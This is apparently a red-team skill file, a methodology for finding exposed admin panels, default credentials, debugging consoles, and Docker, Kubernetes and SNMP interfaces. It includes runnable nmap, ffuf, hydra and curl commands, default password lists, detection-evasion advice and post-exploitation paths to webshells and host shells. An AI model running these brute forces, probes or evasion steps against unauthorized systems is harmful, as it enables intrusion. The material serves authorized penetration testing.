---
name: insecure-management-interface
description: Enumerate insecure management interfaces — router/switch/admin panels, default credentials, exposed debugging consoles, and management endpoints
version: 1.0.0
phase: enum
category: enumeration
tags: [management-interface, admin-panel, default-creds, router]
tools: [curl, ffuf, nmap, hydra, changeme]
difficulty: beginner
opsec_level: medium
time_estimate: 30m
severity_if_found: high
mitre_attack:
  - T1046
  - T1078
---

## When to Use

- Target scope includes known or suspected management subdomains or non-standard web ports (8080, 8443, 9090, 10000)
- IoT, network infrastructure, or embedded device exposure in scope — routers, switches, cameras, UPS, HVAC controllers
- Lateral movement toward management VLANs post-exploitation
- Any engagement where exposed consoles (Jenkins, Kibana, Grafana, phpMyAdmin) could yield easy access
- SNMP or UPnP-enabled devices present on the target network

## What It Does

Discovers and tests insecure management interfaces exposed on the target.

**Admin panel discovery**: Wordlist-based brute force of common admin login paths — /admin, /administrator, /manager, /console, /phpmyadmin, /pma, /swagger, /docs, /graphql, /actuator, /health, /.env, /server-status, /cgi-bin/. Focus first on paths from `robots.txt` disallow list as those are the most likely candidates. Every discovered panel is a potential authentication bypass or default credential target.

**Default credential testing**: Tests known default passwords for routers (Cisco admin/admin, MikroTik admin/blank, Ubiquiti ubnt/ubnt), switches (HP, Dell, Cisco), cameras (Hikvision admin/12345, Dahua admin/admin), and IoT devices. Uses changeme (~900 device database), cirt.net, and NIST default-passwords. A single hit often grants full administrative access to the device.

**Exposed debugging consoles**: Probes for unauthenticated access to Jenkins (script console → RCE), Kibana (log access → credential mining), Grafana (dashboard access → data source pivot), phpMyAdmin (SQL query → SELECT INTO OUTFILE → webshell), pgAdmin, Jupyter Notebook (code execution), and RabbitMQ management. These tools are frequently deployed without authentication in internal networks.

**Management port enumeration**: Scans non-standard HTTP/HTTPS ports commonly used for device management: 8080 (tomcat/jenkins), 8443 (alternative SSL), 9090 (Cockpit/Prometheus), 10000 (Webmin), 3000 (Grafana), 5601 (Kibana), 8888 (Jupyter). Each port has a well-known associated tool with known default credentials and CVEs.

**SNMP public community**: Validates read access to device configuration via SNMP v2c with community `public` — often reveals system info, interfaces, running processes, and network topology. SNMP write via community `private` can allow complete device reconfiguration.

**Container/API exposure**: Probes Docker API (2375/2376 → unauthenticated → docker exec → host RCE), Kubernetes dashboard (6443/8001/8443 → pod exec → container breakout), Docker Registry (5000 → image pull → embedded secrets).

## Methodology

### Step 1: Management Port & SNMP Discovery
```bash
# Scan common management ports across target subnet
nmap -p 80,443,8080,8443,9090,10000,161,1900,2375,2376,3000,4001,5000,5601,8443,9000,9001,9443 -T4 -Pn -oA mgmt_ports $TARGET_RANGE

# SNMP sweep for public community strings
nmap -sU -p 161 --script snmp-brute --script-args snmp-brute.communitiesdb=public $TARGET_RANGE
```
Use `-T2` and `--randomize-hosts` for stealth. Consider scanning from a compromised internal host for lateral movement scenarios.

### Step 2: Admin Panel Discovery
```bash
ffuf -u https://$TARGET/FUZZ -w /usr/share/wordlists/admin-panels.txt -c -t 50 -o admin_panels.json
```
Key paths: /admin, /administrator, /manager, /panel, /console, /webadmin, /phpmyadmin, /pma, /swagger, /docs, /graphql, /actuator, /health, /.env, /server-status, /cgi-bin/, /login, /portal, /management, /status, /debug, /test, /dev.

**Interpretation**: A 200 response with a login form is a finding (admin panel exposed). A 200 with no login form (plain directory listing or API response) is a HIGH finding — it means unauthenticated access to management functions.

### Step 3: Default Credential Testing
```bash
hydra -l admin -P /usr/share/wordlists/default-passwords.txt -f $TARGET -s 8080 http-post-form "/login:user=admin&pass=^PASS^:F=incorrect"
changeme --host $TARGET --port 8080 --protocol https --threads 10 --output changeme_results.json
```
Key vendor defaults: Router/APs (admin/admin, root/admin, admin/1234), Cameras (admin/12345, root/pass), Switches (cisco/cisco, enable blank, hp/hp), IoT (admin/admin, root/root). Credential databases: cirt.net, changeme (~900), NIST.

**Testing strategy**: Try admin/admin and admin/password first (80% hit rate for exposed panels). Then use changeme for broad coverage. Then hydra for specific form-based brute force when you know the device type.

### Step 4: Exposed Debugging Consoles
```bash
# Probe each console type
for url in \
  "https://$TARGET:8080/jenkins/script" \
  "https://$TARGET:5601/api/status" \
  "https://$TARGET:3000/api/health" \
  "https://$TARGET/phpmyadmin/" \
  "https://$TARGET:8888/api/contents" \
  "https://$TARGET:15672/" \
  "https://$TARGET:5050/"; do
  echo "--- $url ---"
  curl -sk --connect-timeout 3 -o /dev/null -w "HTTP %{http_code} | %{redirect_url}" "$url" 2>/dev/null && echo
done
```
**Jenkins-specific**: If `/jenkins/script` or `/script` returns 200, you have unauthenticated Groovy script console access — this is immediate RCE. Kibana on 5601 without auth means all indexed logs (potentially containing credentials, API keys, PII) are readable.

### Step 5: Container & Orchestration Exposure
```bash
# Docker API — unauthenticated access to container management
curl -s http://$TARGET:2375/version | jq . && curl -s http://$TARGET:2375/containers/json?all=true | jq '.[].Names'

# Kubernetes — pod listing and dashboard access
curl -s -k https://$TARGET:6443/api/v1/namespaces/default/pods | head -50 && curl -s -k https://$TARGET:8443/ | grep -i dashboard

# Docker Registry — image listing and pull
curl -s http://$TARGET:5000/v2/_catalog && curl -s http://$TARGET:5000/v2/$IMAGE/tags/list
```
Docker API on 2375 without TLS means `docker -H tcp://$TARGET:2375 ps` works from your machine — full container escape potential.

### Step 6: UPnP & SNMP Details
```python
# UPnP multicast — discover exposed management devices
import socket; import struct
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
sock.settimeout(3)
sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, struct.pack('4sl', socket.inet_aton('239.255.255.250'), socket.INADDR_ANY))
sock.sendto(b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 3\r\nST: ssdp:all\r\n\r\n', ('239.255.255.250', 1900))
while True:
    try: data, addr = sock.recvfrom(1024); print(f'{addr}: {data.decode(errors="ignore")[:200]}')
    except: break
```
```bash
# SNMP system and process enumeration
snmpwalk -v2c -c public $TARGET .1.3.6.1.2.1.1  # system description, uptime, contact
snmpwalk -v2c -c public $TARGET .1.3.6.1.2.1.25  # running processes and users
```

### Step 7: Automated Orchestration
```bash
# httpx for rapid service fingerprinting before deep scanning
httpx -l open_ports.txt -status-code -content-length -tech-detect -title -o service_fingerprints.txt
```

## Detection & OPSEC

**What Triggers Alerts**: Sequential port scanning on non-standard ports, Hydra/changeme credential bursts, accesses to /actuator or /api paths, SNMP sweeps with default community strings, UPnP M-SEARCH broadcasts, Docker API version queries. All are well-known SIEM signatures. Repeated 404s followed by a 200 on /admin/ is a classic brute-force pattern that WAFs detect and block.

**OPSEC Countermeasures**: Use `--random-agent` and `--random-delay` with httpx/ffuf to blend with normal traffic. Proxy through compromised internal hosts — external scanning of management interfaces is much more visible and likely to trigger perimeter defenses. Slow credential testing to < 3 req/min per endpoint to avoid account lockouts and rate-limit triggers. For SNMP use single community per host rather than sweeping the entire subnet — broadcast SNMP probes are very visible. Prefer single-request probes before committing to deep scanning. Use SOCKS proxy chains and rotate exit nodes between discovery and exploitation.

**Post-Exploitation Value Chain**:
- Jenkins with script console → execute arbitrary Groovy → RCE on build node
- phpMyAdmin with default creds → SELECT INTO OUTFILE → webshell on web root
- Docker API without auth → docker exec —privileged → host shell escape
- Kibana without auth → access all indexed logs → credential mining
- Kubernetes dashboard → pod exec → container breakout
- Grafana without auth → data source pivot to Prometheus/InfluxDB

**Evidence Collection**: Screenshot each panel showing the URL bar and version info. Record HTTP response headers (Server, X-Powered-By). Save full HTML of login pages — hidden fields and HTML comments often reveal version numbers and technology stack. Note device manufacturer, model, and firmware. Capture Docker container lists and running images. Save unauthenticated API responses as JSON.

**Reporting template**: For each finding, include: URL, port, detected service/device, authentication status (open/unauthenticated/credential-protected), default creds tested and results, response headers, and a screenshot.

## References

- [CIRT Default Passwords](https://cirt.net/passwords)
- [changeme — Default credential scanner](https://github.com/ztgrace/changeme)
- [Nmap NSE snmp-brute](https://nmap.org/nsedoc/scripts/snmp-brute.html)
- [Docker Engine Security](https://docs.docker.com/engine/security/)
- [OWASP Management Interface Testing](https://owasp.org/www-project-web-security-testing-guide/)
- [MITRE T1046 — Network Service Scanning](https://attack.mitre.org/techniques/T1046/)
- [MITRE T1078 — Valid Accounts](https://attack.mitre.org/techniques/T1078/)
